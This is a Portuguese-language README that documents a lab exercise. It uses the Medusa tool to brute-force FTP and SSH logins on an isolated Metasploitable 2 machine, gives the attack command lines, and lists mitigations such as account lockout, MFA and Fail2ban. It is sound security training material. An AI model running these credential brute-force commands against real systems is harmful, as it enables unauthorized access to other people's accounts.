# desafio-medusa
Documentação de testes de força bruta com Medusa em ambiente controlado

# Laboratório de Testes de Força Bruta e Avaliação de Credenciais com Medusa

## 📌 Visão Geral
Este repositório documenta a execução de testes de segurança defensiva e ofensiva simulando ataques de dicionário e força bruta (*brute-force*) utilizando a ferramenta **Medusa** contra serviços vulneráveis na máquina **Metasploitable 2**, em um ambiente virtualizado totalmente isolado e controlado.

---

## 🛠️ Arquitetura da Rede e Laboratório
O ambiente foi configurado com uma topologia de dupla interface para garantir a isolamento total do laboratório de testes em relação ao tráfego externo, mantendo acesso à internet apenas para atualização de ferramentas e documentação.

* **Máquina Atacante (Kali Linux):**
  * `eth0`: IP Estático `192.168.10.1/24` (Rede Interna / Host-Only — Isolada para o Lab)
  * `eth1`: IP via DHCP (NAT — Conexão com a Internet via VirtualBox)
* **Máquina Alvo (Metasploitable 2):**
  * `eth0`: IP Estático `192.168.10.2/24` (Rede Interna / Host-Only)

---

## 🎯 Serviços Auditados e Comandos Executados

### 1. Teste de Força Bruta no Serviço FTP (Porta 21)
Execução de teste de dicionário para validação de credenciais de acesso ao serviço de transferência de arquivos:

\`\`\`bash
medusa -h 192.168.10.2 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
\`\`\`

### 2. Teste de Autenticação no Serviço SSH (Porta 22)
Auditoria de robustez de senhas para acesso shell remoto:

\`\`\`bash
medusa -h 192.168.10.2 -U usuarios.txt -P senhas.txt -M ssh
\`\`\`

---

## 🛡️ Medidas de Mitigação e Recomendações
Para prevenir e mitigar vetores de ataque por força bruta, recomendam-se as seguintes boas práticas:

1. **Política de Senhas Fortes:** Exigir complexidade mínima, comprimento elevado e rotação periódica.
2. **Bloqueio de Contas (*Account Lockout*):** Configurar limite de tentativas incorretas consecutivas.
3. **Autenticação Multi-Fator (MFA):** Implementar MFA obrigatório para serviços expostos.
4. **Proteção de Camada de Rede:** Utilizar ferramentas como `Fail2ban` para banir IPs temporariamente e configurar regras de firewall restritivas.
5. **Monitoramento e Logs:** Centralizar logs em soluções SIEM para detecção de anomalias em tempo real.
